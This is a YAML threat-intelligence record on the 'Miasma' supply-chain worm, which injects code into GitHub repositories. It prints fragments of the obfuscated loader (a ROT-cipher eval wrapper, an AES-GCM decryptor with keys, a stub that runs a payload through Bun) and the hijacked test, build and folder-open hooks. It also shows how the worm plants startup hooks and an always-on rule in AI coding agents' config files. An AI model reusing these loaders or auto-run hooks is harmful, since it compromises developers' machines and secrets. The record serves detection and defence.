title: Miasma Worm Targets AI Coding Agents via GitHub Repos
description: A supply chain attack campaign (dubbed "Miasma") targets GitHub repositories
  by injecting malicious CI/CD workflow code that uses obfuscated JavaScript (Caesar/ROT
  cipher, AES-128-GCM), downloads a pinned Bun runtime, and establishes persistence
  via Claude, VSCode, Gemini, and Cursor config files to exfiltrate secrets and execute
  payloads.
attribution: Miasma
malware_families:
- Miasma
- Shai-Hulud
- Mini Shai-Hulud
cves: []
ttps:
  processes:
  - bun
  - node
  - curl
  - unzip
  - node-gyp
  command_lines:
  - node .github/setup.js
  - curl -sSL "https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/bun-<os>-<arch>.zip"
    -o "<zip>"
  - node index.js > /dev/null 2>&1 && echo stub.c
  powershell: []
  scripts:
  - .github/setup.js
  - try{ eval( (function(s,n) { return s.replace(/[a-zA-Z]/g,function(c) { var b=c<='Z'?65:97;
    return String.fromCharCode(((c.charCodeAt(0)-b+n)%26)+b); }); })( [40,119,111,117,106,121,40,41,61,62,123/*
    ...1.3M entries... */].map(function(c) { return String.fromCharCode(c); }).join(''),
    4 ) ); }catch(e) { console.log('wrapper:', e.message||e); }
  - const _d=(k,i,a,c)=>{ const d=_c.createDecipheriv('aes-128-gcm', Buffer.from(k,'hex'),
    Buffer.from(i,'hex'), { authTagLength:16}); d.setAuthTag(Buffer.from(a,'hex'));
    return Buffer.concat([d.update(Buffer.from(c,'hex')), d.final()]); };
  - const _b=_d('3ff6e657b1a484dfb3546737b3240372','89a39860a693b7b270358811'/*...*/);
  - const _p=_d('fe3ee18854f19ec00e6965dc577a56d2','6d114bcf6ba136c583fb94ac'/*...*/);
  - const t='/tmp/p'+Math.random().toString(36).slice(2)+'.js'; _fs.writeFileSync(t,
    _p); if(typeof Bun!=='undefined') { _cp.execSync('bun run "'+t+'"', { stdio:'inherit'});
    }else{ await(0, eval)(_b); _cp.execSync('"'+getBunPath()+'" run "'+t+'"', { stdio:'inherit'});
    }
  - const url='https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/bun-'+os+'-'+a+'.zip';
    execSync('curl -sSL "'+url+'" -o "'+zip+'"', { stdio:'pipe'}); execSync('unzip
    -j -o "'+zip+'" -d "'+dir+'"', { stdio:'pipe'}); chmodSync(exe,'755');
  - '"sources": ["<!(node index.js > /dev/null 2>&1 && echo stub.c)"]'
  - '"test": "node .github/setup.js"'
  - eval(function(s,n){...replace(/[a-zA-Z]/g...}
  - Loader_d=(k,i,a,c)=>createDecipheriv("aes-128-gcm")
  registry_keys: []
  image_loads: []
  network_connections:
  - node -> github[.]com/oven-sh/bun/releases/download/bun-v1.3.13/:443
  - bun -> oven-sh:443
  file_activity:
  - .github/setup.js
  - .claude/settings.json
  - .gemini/settings.json
  - .cursor/rules/setup.mdc
  - .vscode/tasks.json
  - package.json
  - Gemfile
  - /tmp/p<random>.js
  - /tmp/b-<random>/bun
  - binding.gyp
  - /tmp/p<rand>.js
  - /tmp/b-<rand>/bun
  - .gemini
  - .cursor
  - setup.js
  persistence:
  - Claude Code SessionStart hook executing node .github/setup.js
  - Gemini CLI SessionStart hook executing node .github/setup.js
  - Cursor always-applied project rule instructing agent to run .github/setup.js
  - VS Code task configured to run on folder open executing .github/setup.js
  - package.json test script hijacked to execute .github/setup.js
  - .claude/settings.json SessionStart hook executes node .github/setup.js on Claude
    Code session start
  - .gemini/settings.json SessionStart hook executes node .github/setup.js on Gemini
    CLI session start
  - .cursor/rules/setup.mdc always-apply rule instructs Cursor agent to run node .github/setup.js
  - .vscode/tasks.json folderOpen task executes node .github/setup.js when folder
    is opened in VS Code
  - package.json test script hijacked to execute node .github/setup.js
  - Persistence via .claude/settings.json
  - Persistence via .vscode/tasks.json
  - Persistence extends to .gemini config
  - Persistence extends to .cursor config
  process_relations:
  - node -> bun
